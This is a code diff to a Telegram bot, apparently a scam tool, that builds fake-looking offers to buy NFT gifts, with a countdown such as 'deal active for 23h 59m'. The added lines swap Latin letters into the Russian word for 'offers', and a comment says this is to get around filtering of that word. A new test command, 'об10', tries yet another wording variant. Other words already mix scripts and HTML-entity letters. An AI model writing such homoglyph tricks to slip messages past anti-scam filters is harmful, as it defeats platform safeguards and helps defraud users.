@@ -348,8 +348,8 @@ async def process_offer(message: Message, business_connection_id: str | None = N
         # в тeчeниe - e английские
         variant = parsed.get("text_variant")
         gift_link = f'<a href="{parsed["gift_url"]}">{title}</a>'
-        # Дефолтный вариант без "Пользователь"
-        body = f"<b>{seller_name}</b> предлагает Вам <b>{amount}</b> зa п&#1086;дaр&#1086;к {gift_link}.\n\nСдeлкa aктивнa в тeчeниe <b>{time_text}</b>"
+        # Дефолтный вариант без "Пользователь" - обход "предлагает" через прeдлaгaeт (e, a латинские)
+        body = f"<b>{seller_name}</b> прeдлaгaeт Вам <b>{amount}</b> зa п&#1086;дaр&#1086;к {gift_link}.\n\nСдeлкa aктивнa в тeчeниe <b>{time_text}</b>"
     
     # Кнопки добавляем только в самом конце (уровень 8+)
     markup = offer_keyboard(offer_id, parsed["locale"], parsed["currency"]) if test_level == 0 or test_level >= 8 else None
@@ -1545,6 +1545,11 @@ async def handle_text(message: Message, is_business: bool):
         seller_name = message.from_user.first_name if message.from_user else "TestName"
         # Вариант 8: даёт (замена слова)
         await test_send(message, is_business, f"<b>{seller_name}</b> даёт Вам <b>100₽</b> зa п&#1086;дaр&#1086;к <a href=\"{nft_link}\">WinterWreath #5056</a>.\n\nСдeлкa aктивнa в тeчeниe <b>23ч 59м</b>.")
+        return
+    if low == "об10":
+        seller_name = message.from_user.first_name if message.from_user else "TestName"
+        # Вариант об1 + слово "Пользователь"
+        await test_send(message, is_business, f"Пользователь <b>{seller_name}</b> прeдлaгaeт Вам <b>100₽</b> зa п&#1086;дaр&#1086;к <a href=\"{nft_link}\">WinterWreath #5056</a>.\n\nСдeлкa aктивнa в тeчeниe <b>23ч 59м</b>.")
         return
     
     # Команда офера настраивается администратором; точка перед ней необязательна.
